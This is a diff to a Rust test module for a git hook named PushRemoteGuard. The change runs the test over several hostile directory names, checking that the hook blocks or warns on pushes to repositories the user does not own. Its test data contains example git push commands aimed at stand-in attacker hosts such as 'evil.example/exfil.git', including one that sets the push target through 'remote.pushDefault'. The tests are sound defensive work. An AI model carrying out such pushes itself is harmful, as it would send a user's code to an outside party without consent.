@@ -2379,11 +2379,11 @@ mod tests {
 
     // --- #1509: a line naming the directory prints its name flattened ---
 
-    /// A repo named by [`crate::hostile_named_dir`] whose `origin` is `url`.
-    /// Unix only, like the one test that uses it.
+    /// A repo named `name` by [`crate::hostile_named_dir`] whose `origin` is
+    /// `url`. Unix only, like the one test that uses it.
     #[cfg(unix)]
-    fn hostile_checkout(root: &std::path::Path, url: &str) -> std::path::PathBuf {
-        let dir = crate::hostile_named_dir(root);
+    fn hostile_checkout(root: &std::path::Path, name: &str, url: &str) -> std::path::PathBuf {
+        let dir = crate::hostile_named_dir(root, name);
         cadence_hooks_core::git_fixtures::init_repo(&dir);
         cadence_hooks_core::git_fixtures::git_in(&dir, &["remote", "add", "origin", url]);
         dir
@@ -2404,16 +2404,6 @@ mod tests {
         // repo with no remote, where a push to a name git does not know cannot
         // resolve; `mine` is one whose `origin` is owned, so its push is
         // allowed with the nudge.
-        let root = tempfile::tempdir().expect("tempdir");
-        let hostile = hostile_checkout(root.path(), "https://github.com/evil/y.git");
-        let bare_root = tempfile::tempdir().expect("tempdir");
-        let bare = crate::hostile_named_dir(bare_root.path());
-        cadence_hooks_core::git_fixtures::init_repo(&bare);
-        let mine_root = tempfile::tempdir().expect("tempdir");
-        let mine = hostile_checkout(mine_root.path(), "https://github.com/cameronsjo/y.git");
-        let h = hostile.to_str().expect("utf-8 path").to_string();
-        let b = bare.to_str().expect("utf-8 path").to_string();
-        let m = mine.to_str().expect("utf-8 path").to_string();
         let owned = crate::github_origin_repo();
         let o = owned.path().to_str().expect("utf-8 path").to_string();
         let not_yours = "Push target is not yours";
@@ -2421,55 +2411,72 @@ mod tests {
         let unresolved = "Cannot resolve push target";
         let unverified = "Push directory could not be verified";
         let url = "https://evil.example/exfil.git";
-        with_env(&owners_only(), || {
-            for (outcome, heading, command, cwd) in [
-                (Block, not_yours, "git push origin main".to_string(), &h),
-                (Block, no_owner, format!("git push {url} main"), &h),
-                (Block, unresolved, "git push nosuch main".to_string(), &b),
-                (
-                    Block,
-                    no_owner,
-                    "git -c remote.pushDefault=https://evil.example/x.git push main".to_string(),
-                    &h,
-                ),
-                (
-                    Block,
-                    not_yours,
-                    format!("git -C \"{h}\" push origin main"),
-                    &o,
-                ),
-                (
-                    Block,
-                    no_owner,
-                    format!("git -C \"{h}\" push {url} main"),
-                    &o,
-                ),
-                (
-                    Block,
-                    unresolved,
-                    format!("git -C \"{b}\" push nosuch main"),
-                    &o,
-                ),
-                (
-                    Nudge,
-                    unverified,
-                    "cd \"$D\" && git push origin main".to_string(),
-                    &m,
-                ),
-                (
-                    Nudge,
-                    unverified,
-                    "popd; git push origin main".to_string(),
-                    &m,
-                ),
-            ] {
-                let result = PushRemoteGuard.run(&make_bash_with_cwd(&command, cwd));
-                assert_eq!(result.outcome, outcome, "{command}: {:?}", result.message);
-                let message = result.message.unwrap_or_default();
-                assert!(message.contains(heading), "{command}: {message:?}");
-                crate::assert_hostile_dir_flattened(&message, &command);
-            }
-        });
+        for (name, displayed) in crate::HOSTILE_DIR_NAMES {
+            let root = tempfile::tempdir().expect("tempdir");
+            let hostile = hostile_checkout(root.path(), name, "https://github.com/evil/y.git");
+            let bare_root = tempfile::tempdir().expect("tempdir");
+            let bare = crate::hostile_named_dir(bare_root.path(), name);
+            cadence_hooks_core::git_fixtures::init_repo(&bare);
+            let mine_root = tempfile::tempdir().expect("tempdir");
+            let mine = hostile_checkout(
+                mine_root.path(),
+                name,
+                "https://github.com/cameronsjo/y.git",
+            );
+            let h = hostile.to_str().expect("utf-8 path").to_string();
+            let b = bare.to_str().expect("utf-8 path").to_string();
+            let m = mine.to_str().expect("utf-8 path").to_string();
+            with_env(&owners_only(), || {
+                for (outcome, heading, command, cwd) in [
+                    (Block, not_yours, "git push origin main".to_string(), &h),
+                    (Block, no_owner, format!("git push {url} main"), &h),
+                    (Block, unresolved, "git push nosuch main".to_string(), &b),
+                    (
+                        Block,
+                        no_owner,
+                        "git -c remote.pushDefault=https://evil.example/x.git push main"
+                            .to_string(),
+                        &h,
+                    ),
+                    (
+                        Block,
+                        not_yours,
+                        format!("git -C \"{h}\" push origin main"),
+                        &o,
+                    ),
+                    (
+                        Block,
+                        no_owner,
+                        format!("git -C \"{h}\" push {url} main"),
+                        &o,
+                    ),
+                    (
+                        Block,
+                        unresolved,
+                        format!("git -C \"{b}\" push nosuch main"),
+                        &o,
+                    ),
+                    (
+                        Nudge,
+                        unverified,
+                        "cd \"$D\" && git push origin main".to_string(),
+                        &m,
+                    ),
+                    (
+                        Nudge,
+                        unverified,
+                        "popd; git push origin main".to_string(),
+                        &m,
+                    ),
+                ] {
+                    let result = PushRemoteGuard.run(&make_bash_with_cwd(&command, cwd));
+                    assert_eq!(result.outcome, outcome, "{command}: {:?}", result.message);
+                    let message = result.message.unwrap_or_default();
+                    assert!(message.contains(heading), "{command}: {message:?}");
+                    crate::assert_hostile_dir_flattened(&message, displayed, &command);
+                }
+            });
+        }
     }
 
     #[test]
